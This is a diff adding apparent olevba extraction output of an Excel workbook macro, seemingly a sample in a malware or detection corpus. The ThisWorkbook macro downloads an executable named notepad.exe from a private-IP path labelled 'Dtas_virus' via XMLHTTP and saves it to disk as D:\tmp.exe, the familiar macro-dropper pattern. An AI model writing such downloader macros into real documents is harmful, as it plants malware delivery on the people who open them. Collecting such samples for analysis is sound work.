@@ -1,0 +1,43 @@
+Filename     : ./macros/e8364a2f9bdd7fa959f354efaa23793c2c5d273807fb27a9c7cc315ba685e14f
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+
+
+Sub HelloWorkBook()
+
+    Dim myURL As String
+    myURL = "http://172.22.4.11/Dtas_virus/Mike/notepad.exe"
+    
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+    WinHttpReq.Open "GET", myURL, False
+    WinHttpReq.Send
+    
+    myURL = WinHttpReq.ResponseBody
+    MsgBox ("Status" + CStr(WinHttpReq.Status))
+    If WinHttpReq.Status = 200 Then
+        
+        Set oStream = CreateObject("ADODB.Stream")
+        oStream.Open
+        oStream.Type = 1
+        oStream.Write WinHttpReq.ResponseBody
+        MsgBox ("Test")
+        strStreamPath = "D:\tmp.exe"
+        oStream.SaveToFile strStreamPath
+        oStream.Close
+    End If
+
+
+    MsgBox ("Hello ThisWorkBook!!!!XDD")
+    
+End Sub
+
